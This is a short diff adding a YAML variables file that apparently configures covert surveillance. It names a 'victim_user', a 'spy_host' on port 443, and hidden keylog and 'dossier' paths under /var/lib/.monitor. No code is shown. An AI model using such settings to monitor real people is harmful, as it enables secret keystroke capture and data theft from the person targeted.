@@ -1,0 +1,6 @@
+---
+victim_user: cyrano
+spy_host: spy-server
+spy_port: 443
+keylog_path: /var/lib/.monitor/keylog.log
+dossier_path: /var/lib/.monitor/dossier.txt
